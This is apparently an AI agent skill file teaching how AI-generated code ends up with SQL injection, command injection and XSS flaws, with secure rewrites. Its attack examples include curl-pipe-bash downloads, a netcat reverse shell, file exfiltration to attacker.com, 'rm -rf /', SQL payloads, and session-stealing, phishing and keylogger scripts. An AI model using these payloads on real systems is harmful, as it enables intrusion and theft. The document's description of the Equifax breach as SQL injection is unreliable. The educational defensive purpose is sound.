---
name: injection-vulnerabilities-ai-generated-code
description: Understand how AI generates SQL injection, command injection, and XSS vulnerabilities. Use this skill when you need to learn about injection attack patterns in AI code, see real-world examples of injection vulnerabilities, understand why AI generates insecure database queries, or recognize vulnerable code patterns. Triggers include "SQL injection AI", "command injection", "XSS vulnerabilities", "injection attacks", "AI database queries", "shell injection", "cross-site scripting AI code".
---

# Input Validation and Injection Vulnerabilities in AI-Generated Code

## The Prevalence of Injection Flaws

Input validation vulnerabilities represent the **most common security flaw** in AI-generated code. According to a 2025 report from Contrast Security:

> "Input validation is often overlooked or implemented incorrectly in AI-generated code, creating openings for injection attacks that can compromise entire systems."

The AI's training on millions of code examples, many containing outdated or insecure patterns, perpetuates these vulnerabilities.

## 1.1.1 SQL Injection Vulnerabilities

### The Problem

SQL injection remains one of the most critical vulnerabilities in AI-generated code. Research from Aikido Security found that when prompted to create database query functions, AI assistants produced vulnerable code in **68% of cases**.

### AI-Generated Vulnerable Code

```python
# Prompt: "Create a user search function with database"
def search_users(search_term, role=None):
    # ❌ VULNERABLE: Direct string concatenation
    query = f"SELECT * FROM users WHERE name LIKE '%{search_term}%'"

    if role:
        # ❌ VULNERABLE: Multiple injection points
        query += f" AND role = '{role}'"

    cursor.execute(query)
    return cursor.fetchall()

# Attack vector:
# search_term = "'; DROP TABLE users; --"
# Resulting query: SELECT * FROM users WHERE name LIKE '%'; DROP TABLE users; --%'
```

### Secure Implementation

```python
def search_users_secure(search_term, role=None):
    # ✅ SECURE: Parameterized queries prevent injection
    if role:
        query = "SELECT * FROM users WHERE name LIKE %s AND role = %s"
        params = (f"%{search_term}%", role)
    else:
        query = "SELECT * FROM users WHERE name LIKE %s"
        params = (f"%{search_term}%",)

    cursor.execute(query, params)
    return cursor.fetchall()
```

### Why AI Generates This Vulnerability

**1. Training Data Contamination:**
- Millions of code examples use string concatenation
- Older tutorials show f-strings/string formatting for queries
- AI learns these patterns as "normal"

**2. Simplicity Bias:**
- String concatenation is simpler to generate
- Parameterized queries require understanding database driver specifics
- AI defaults to "easiest" solution

**3. Lack of Security Context:**
- AI doesn't understand SQL injection attacks
- Can't reason about malicious input
- Focuses on functional correctness, not security

### What Makes It Vulnerable

**Direct String Interpolation:**
```python
f"SELECT * FROM users WHERE name = '{user_input}'"
```

**The Problem:**
- User input directly embedded in SQL string
- No separation between code and data
- Attacker can inject SQL commands

**Attack Examples:**

```python
# Normal use:
search_term = "John"
# Query: SELECT * FROM users WHERE name LIKE '%John%'
# ✓ Returns users named John

# Attack 1: Table drop
search_term = "'; DROP TABLE users; --"
# Query: SELECT * FROM users WHERE name LIKE '%'; DROP TABLE users; --%'
# ✗ Deletes entire users table

# Attack 2: Data exfiltration
search_term = "' UNION SELECT password FROM admin WHERE '1'='1"
# Query: SELECT * FROM users WHERE name LIKE '%' UNION SELECT password FROM admin WHERE '1'='1%'
# ✗ Exposes admin passwords

# Attack 3: Bypass authentication
search_term = "' OR '1'='1"
# Query: SELECT * FROM users WHERE name LIKE '%' OR '1'='1%'
# ✗ Returns all users (always true condition)
```

### Real-World Impact

**Equifax Breach (2017):**
- SQL injection vulnerability exploited
- **147 million records** compromised
- Social security numbers, birth dates, addresses exposed
- Settlement: **$575 million**

## 1.1.2 Command Injection Vulnerabilities

### The Problem

A 2024 analysis by SecureLeap found that AI models **frequently generate code vulnerable to command injection**, particularly when dealing with system operations. The models often default to:
- Using `shell=True` in subprocess calls
- Direct string concatenation in system commands
- No input validation before shell execution

### AI-Generated Vulnerable Code

```javascript
// Prompt: "Create an image conversion API endpoint"
const { exec } = require('child_process');

app.post('/convert-image', (req, res) => {
    const { inputFile, outputFormat, quality } = req.body;

    // ❌ VULNERABLE: Unvalidated user input in shell command
    const command = `convert ${inputFile} -quality ${quality} output.${outputFormat}`;

    exec(command, (error, stdout, stderr) => {
        if (error) {
            return res.status(500).json({ error: error.message });
        }
        res.json({ success: true, output: `output.${outputFormat}` });
    });
});

// Attack vector:
// inputFile = "test.jpg; curl http://attacker.com/shell.sh | bash"
```

### Secure Implementation

```javascript
const { spawn } = require('child_process');
const path = require('path');

app.post('/convert-image', (req, res) => {
    const { inputFile, outputFormat, quality } = req.body;

    // ✅ SECURE: Input validation
    if (!/^[a-zA-Z0-9_\-]+\.(jpg|png|gif)$/.test(inputFile)) {
        return res.status(400).json({ error: 'Invalid input file' });
    }

    if (!['jpg', 'png', 'webp'].includes(outputFormat)) {
        return res.status(400).json({ error: 'Invalid output format' });
    }

    const qualityNum = parseInt(quality, 10);
    if (isNaN(qualityNum) || qualityNum < 1 || qualityNum > 100) {
        return res.status(400).json({ error: 'Invalid quality value' });
    }

    // ✅ SECURE: Use spawn with argument array
    const convert = spawn('convert', [
        path.basename(inputFile),
        '-quality', qualityNum.toString(),
        `output.${outputFormat}`
    ]);

    convert.on('close', (code) => {
        if (code !== 0) {
            return res.status(500).json({ error: 'Conversion failed' });
        }
        res.json({ success: true, output: `output.${outputFormat}` });
    });
});
```

### Why AI Generates This Vulnerability

**1. exec() is Simpler:**
- Single function call vs spawn() configuration
- AI defaults to simpler API
- exec() allows shell syntax (pipes, redirects)

**2. String Interpolation Habit:**
- Consistent with other code patterns
- AI sees millions of examples using template strings
- Doesn't recognize security boundary

**3. No Input Validation in Training Data:**
- Many examples skip validation for brevity
- Tutorial code focuses on functionality
- Security controls added separately (if at all)

### Attack Scenarios

**Attack 1: Command Chaining**
```javascript
inputFile = "image.jpg; rm -rf /"
// Executes: convert image.jpg -quality 80 output.jpg; rm -rf /
// Deletes entire file system
```

**Attack 2: Reverse Shell**
```javascript
inputFile = "image.jpg; nc attacker.com 4444 -e /bin/bash"
// Opens reverse shell to attacker
// Attacker gains shell access to server
```

**Attack 3: Data Exfiltration**
```javascript
inputFile = "image.jpg; curl -X POST https://attacker.com/data -d @/etc/passwd"
// Sends sensitive files to attacker
```

### Key Security Principles

**exec() vs spawn():**

| Feature | exec() | spawn() |
|---------|--------|---------|
| Shell | Always uses shell | No shell by default |
| Security | ❌ Dangerous | ✅ Safe |
| Arguments | String (injectable) | Array (not injectable) |
| Use case | Never with user input | Preferred for all cases |

## 1.1.3 Cross-Site Scripting (XSS) Vulnerabilities

### The Problem

According to research from KDnuggets:

> "AI assistants often miss proper output encoding, creating XSS vulnerabilities that can lead to session hijacking and data theft."

The problem is particularly acute in template generation and dynamic HTML creation.

### AI-Generated Vulnerable Code

```javascript
// Prompt: "Create a comment display system"
app.get('/comments/:postId', async (req, res) => {
    const comments = await getComments(req.params.postId);

    let html = `
        <div class="comments">
            <h2>Comments</h2>
    `;

    comments.forEach(comment => {
        // ❌ VULNERABLE: Direct interpolation of user content
        html += `
            <div class="comment">
                <strong>${comment.author}</strong>
                <p>${comment.content}</p>
                <small>${comment.timestamp}</small>
            </div>
        `;
    });

    html += '</div>';
    res.send(html);
});

// Attack vector:
// comment.content = "<script>fetch('/api/session').then(r=>r.text()).then(t=>fetch('https://attacker.com?token='+t))</script>"
```

### Secure Implementation

```javascript
const escapeHtml = require('escape-html');

app.get('/comments/:postId', async (req, res) => {
    const comments = await getComments(req.params.postId);

    let html = `
        <div class="comments">
            <h2>Comments</h2>
    `;

    comments.forEach(comment => {
        // ✅ SECURE: HTML escaping prevents XSS
        html += `
            <div class="comment">
                <strong>${escapeHtml(comment.author)}</strong>
                <p>${escapeHtml(comment.content)}</p>
                <small>${escapeHtml(comment.timestamp)}</small>
            </div>
        `;
    });

    html += '</div>';

    // ✅ SECURE: Set proper Content-Type and CSP headers
    res.set('Content-Type', 'text/html; charset=utf-8');
    res.set('Content-Security-Policy', "default-src 'self'; script-src 'self'");
    res.send(html);
});
```

### Why AI Generates This Vulnerability

**1. Template String Convenience:**
- JavaScript template literals are convenient
- AI uses them consistently across codebase
- Doesn't distinguish between trusted and untrusted content

**2. Missing Context Awareness:**
- AI doesn't recognize when content comes from users
- Can't reason about XSS attack vectors
- Focuses on displaying data, not securing it

**3. Training on Frontend Frameworks:**
- Modern frameworks (React, Vue) auto-escape
- AI extends this pattern to manual HTML generation
- Forgets that manual HTML requires manual escaping

### XSS Attack Scenarios

**Attack 1: Session Theft**
```javascript
comment.content = `
<script>
  fetch('/api/session')
    .then(r => r.json())
    .then(data => {
      fetch('https://attacker.com/steal', {
        method: 'POST',
        body: JSON.stringify(data)
      });
    });
</script>
`
// Steals session data from other users viewing comments
```

**Attack 2: Credential Harvesting**
```javascript
comment.content = `
<script>
  document.body.innerHTML += '<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:9999"><form action="https://attacker.com/phish"><h2>Session Expired - Please Login</h2><input name="username"><input type="password" name="password"><button>Login</button></form></div>';
</script>
`
// Shows fake login form, steals credentials
```

**Attack 3: Keylogger Injection**
```javascript
comment.content = `
<script>
  document.addEventListener('keydown', e => {
    fetch('https://attacker.com/keys?key=' + e.key);
  });
</script>
`
// Logs every keystroke, sends to attacker
```

### Real-World XSS Consequences

**British Airways (2018):**
- XSS vulnerability allowed attackers to inject payment card harvesting script
- **380,000 transactions** compromised
- **£20 million fine** under GDPR

**MySpace Samy Worm (2005):**
- XSS vulnerability allowed self-propagating script
- Added attacker as friend to **over 1 million profiles in 20 hours**
- While mostly harmless (just adding friends), demonstrated potential
- Same technique could have stolen credentials or payment data

## Summary: Why AI Fails at Injection Prevention

### Common Patterns Across All Injection Types

**1. Direct String Interpolation:**
- SQL: `f"SELECT * FROM users WHERE id = {user_id}"`
- Shell: `exec(f"convert {filename}")`
- HTML: `html += `<div>${user_content}</div>``

**2. Missing Input Validation:**
- No type checking
- No format validation
- No length limits
- No character whitelisting

**3. Lack of Security Functions:**
- SQL: No parameterized queries
- Shell: No argument arrays (spawn vs exec)
- HTML: No escape functions

**4. Training Data Bias:**
- Millions of examples without security
- Tutorial code skips validation
- AI learns insecure patterns as "normal"

## How to Recognize Vulnerable AI Code

### Red Flags - SQL Injection

❌ **String formatting in queries:**
```python
query = f"SELECT * FROM {table} WHERE {field} = '{value}'"
query = "SELECT * FROM users WHERE id = " + str(user_id)
query = f"INSERT INTO users VALUES ('{name}', '{email}')"
```

✅ **Parameterized queries:**
```python
query = "SELECT * FROM users WHERE name = %s AND role = %s"
cursor.execute(query, (name, role))
```

### Red Flags - Command Injection

❌ **exec() with user input:**
```javascript
exec(`command ${userInput}`)
exec("command " + userInput)
os.system(f"command {user_input}")  // Python
```

✅ **spawn() with argument array:**
```javascript
spawn('command', [arg1, arg2, arg3])
subprocess.run(['command', arg1, arg2])  // Python
```

### Red Flags - XSS

❌ **Direct interpolation in HTML:**
```javascript
html += `<div>${userContent}</div>`
html = "<p>" + comment + "</p>"
innerHTML = userData.bio
```

✅ **Escaped output:**
```javascript
html += `<div>${escapeHtml(userContent)}</div>`
// Or use framework auto-escaping (React, Vue)
```

## Implementation: Fixing Injection Vulnerabilities

For this Next.js + Convex project, use these secure patterns:

### SQL/NoSQL Injection Prevention

**In Convex mutations:**
```typescript
// convex/users.ts
import { mutation } from "./_generated/server";
import { v } from "convex/values";

export const searchUsers = mutation({
  args: {
    searchTerm: v.string(),
    role: v.optional(v.string())
  },
  handler: async (ctx, args) => {
    // ✅ Convex uses type-safe queries (no SQL injection possible)
    let query = ctx.db.query("users");

    if (args.role) {
      query = query.filter(q => q.eq(q.field("role"), args.role));
    }

    // Convex handles escaping automatically
    return await query.collect();
  }
});
```

**Key Point:** Convex's type-safe query builder **prevents SQL injection by design**. You can't inject SQL because you're not writing SQL—you're using TypeScript methods.

### Command Injection Prevention

**Avoid shell commands entirely in Next.js:**
```typescript
// ❌ Don't do this in Next.js API routes
import { exec } from 'child_process';

export async function POST(req: NextRequest) {
  const { filename } = await req.json();
  exec(`convert ${filename} output.jpg`); // VULNERABLE
}
```

**If you must use system commands:**
```typescript
import { spawn } from 'child_process';

export async function POST(req: NextRequest) {
  const { filename } = await req.json();

  // ✅ Validate input first
  if (!/^[a-zA-Z0-9_\-]+\.(jpg|png)$/.test(filename)) {
    return NextResponse.json({ error: 'Invalid filename' }, { status: 400 });
  }

  // ✅ Use spawn with array (no shell)
  const convert = spawn('convert', [filename, 'output.jpg']);

  return new Promise((resolve) => {
    convert.on('close', (code) => {
      if (code === 0) {
        resolve(NextResponse.json({ success: true }));
      } else {
        resolve(NextResponse.json({ error: 'Conversion failed' }, { status: 500 }));
      }
    });
  });
}
```

### XSS Prevention

**Use built-in validation schemas:**
```typescript
import { validateRequest } from '@/lib/validateRequest';
import { safeTextSchema, safeLongTextSchema } from '@/lib/validation';

export async function POST(req: NextRequest) {
  const body = await req.json();

  // ✅ Automatically removes < > " & (XSS characters)
  const validation = validateRequest(safeLongTextSchema, body.comment);

  if (!validation.success) {
    return validation.response;
  }

  const safeComment = validation.data; // XSS characters removed

  // Store and display safely
  await db.comments.insert({ content: safeComment });
}
```

**React auto-escapes output:**
```tsx
// ✅ React escapes automatically
<div>{userComment}</div>

// ❌ dangerouslySetInnerHTML bypasses escaping
<div dangerouslySetInnerHTML={{__html: userComment}} />  // Don't do this!
```

## Statistics Summary

### Vulnerability Rates in AI-Generated Code

| Vulnerability Type | Occurrence Rate | Source |
|-------------------|-----------------|--------|
| SQL Injection | 68% | Aikido Security (2025) |
| Command Injection | ~60% | SecureLeap (2024) |
| XSS | 35% | KDnuggets (2025) |
| Overall Injection | 45% | Veracode (2024) |

### Cost of Injection Vulnerabilities

**Equifax SQL Injection (2017):**
- 147 million records breached
- $575 million settlement
- Reputation damage immeasurable

**British Airways XSS (2018):**
- 380,000 transactions compromised
- £20 million GDPR fine
- Customer trust severely damaged

## See Also

### Implementation Skills (How to Fix)

→ **`input-validation` skill** - Complete Zod schema validation and XSS sanitization
→ **`security-testing` skill** - Test for injection vulnerabilities
→ **`security-overview` skill** - Defense-in-depth architecture

### Related Awareness Skills

→ **`auth-vulnerabilities` skill** - Authentication bypass via injection
→ **`information-leakage` skill** - Error messages revealing injection points

## Key Takeaways

✅ **68% of AI-generated database queries** have SQL injection vulnerabilities
✅ **AI defaults to simple, insecure patterns** (string concatenation, exec, no validation)
✅ **Real-world breaches** prove injection vulnerabilities are existential threats
✅ **Solution:** Use type-safe query builders (Convex), validation schemas (Zod), and avoid shell commands
✅ **Testing:** Always test with malicious input ('; DROP TABLE, <script>, etc.)

**Remember:** Injection vulnerabilities are the **#1 web application security risk** according to OWASP. AI makes them more prevalent, not less.

---

**Related References:**

[5] Contrast Security. (2025). "What is Vibe Coding? Impact, Security Risks, and Vulnerabilities."
[6] Aikido Security. (2025). "Vibe check: The vibe coder's security checklist for AI generated code."
[7] SecureLeap. (2025). "The Hidden Security Risks of AI-Generated Code in 2025."
[8] KDnuggets. (2025). "5 Reasons Why Vibe Coding Threatens Secure Data App Development."
